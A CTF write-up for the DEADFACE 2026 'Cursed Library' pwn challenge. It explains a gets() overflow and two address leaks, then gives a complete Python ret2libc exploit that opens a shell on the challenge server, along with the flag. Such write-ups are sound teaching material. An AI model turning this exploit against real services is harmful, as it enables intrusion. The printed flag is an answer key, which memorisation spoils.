---
title: Cursed Library
tags:
  - DEADFACE CTF 2026
  - Pwn
---

# Cursed Library

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Pwn |
| **Points** | 235 |
| **Author** | @SpiffyLich |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) · Lyna |

## Challenge

> Hey- Charles again. I think we almost have enough information... it looks like parts of each binary all combine to give us the final one, and once we have that, we'll be able to get a direct link to DEADFACE! This one was a bit of a doozy, but I think I found some tools that might help:
>
> First Up: Your Library Card
>
> Submit the flag as `deadface{flag-text}`.

Files given: `Cursed_Library.zip` (514 MB) with the `Cursed_Library` binary and `libc.so.6`. Service: `159.65.228.107:5004`.

## Solution

### The binary is mostly padding

Like [Cursed Mirror](cursed-mirror.md), the 537 MB binary is a bluff: only the first ~33 KB is a real ELF, the rest is random bytes. Protections: PIE and NX on, no stack canary.

### The bug

`checkout()` reads the book title with `gets()` into a 96-byte stack buffer. The saved return address sits at offset `0x68`.

### Two leaks

- **PIE:** menu option `2` with the title `BookOfTheDead` prints the address of the `BookOfTheDead` function (`base + 0x1ba1`).
- **libc:** an unused function, `Necronomicon` (`base + 0x1b6a`), does `printf("%p", puts@got)`. It isn't on the menu, but we can return into it.

The binary has no `pop rdi; ret` gadget, so a classic `puts(puts@got)` stage 1 isn't possible. Returning into `Necronomicon` gives the libc leak for free.

### Exploit chain

1. Option `2` → `BookOfTheDead` → PIE base.
2. Option `2` → overflow: return into `Necronomicon`, then into `main` (`base + 0x1229`) so the menu loops. Read the leaked `puts` → libc base.
3. Option `2` → second overflow: ret2libc `system("/bin/sh")` with gadgets from the given libc.

| libc symbol | offset |
|---|---|
| `puts` | `0x82060` |
| `system` | `0x54790` |
| `"/bin/sh"` | `0x1aaea4` |
| `pop rdi; ret` | `0x2a9b7` |
| `ret` (stack alignment) | `0x2861b` |

Each overflow payload starts with a short title (`x\0`) and pads to the return address.

```python
import socket, re, struct, time
HOST, PORT = '159.65.228.107', 5004
p64 = lambda x: struct.pack('<Q', x)
BOOK, NECRO, MAIN = 0x1ba1, 0x1b6a, 0x1229
PUTS, SYSTEM, BINSH, POP_RDI, RET, PAD = 0x82060, 0x54790, 0x1aaea4, 0x2a9b7, 0x2861b, 0x68

def recvu(s, m=b'> ', t=4):
    s.settimeout(t); b = b''
    try:
        while m not in b:
            c = s.recv(4096)
            if not c: break
            b += c
    except Exception: pass
    return b

def hexleak(b):
    m = re.findall(rb'0x([0-9a-f]+)', b)
    return int(m[-1], 16) if m else None

s = socket.create_connection((HOST, PORT)); recvu(s)
s.sendall(b'2\n'); recvu(s); s.sendall(b'BookOfTheDead\n')
base = hexleak(recvu(s)) - BOOK

s.sendall(b'2\n'); recvu(s)
s.sendall(b'x\0' + b'A' * (PAD - 2) + p64(base + NECRO) + p64(base + MAIN) + b'\n')
libc = hexleak(recvu(s)) - PUTS

rop = p64(libc + RET) + p64(libc + POP_RDI) + p64(libc + BINSH) + p64(libc + SYSTEM)
s.sendall(b'2\n'); recvu(s); s.sendall(b'x\0' + b'A' * (PAD - 2) + rop + b'\n')
time.sleep(0.4)
s.sendall(b'ls -la /app\ncat Necronomicon.txt\n')
```

Retry if a leaked address contains a `\n` byte (`gets` stops there).

### Finding the flag

The shell runs as uid 1000 in `/app`. Forking is limited, so pipes and subshells fail; send plain commands one at a time. There is no `flag.txt`. The flag is in `Necronomicon.txt`, the "forbidden tome" the menu refuses to open. `SpiceLatte.txt` and `PumpkinBread.txt` are recipe decoys.

## Flag

!!! flag "Flag"
    `deadface{T#3_L1br4ry_Kn0w5_A11}`

## Takeaways

Look for unused functions that print pointers: returning into one can replace a missing `pop rdi` gadget. Charles' note says pieces of each binary combine into a final challenge, so keep this flag with the Cursed Mirror one.
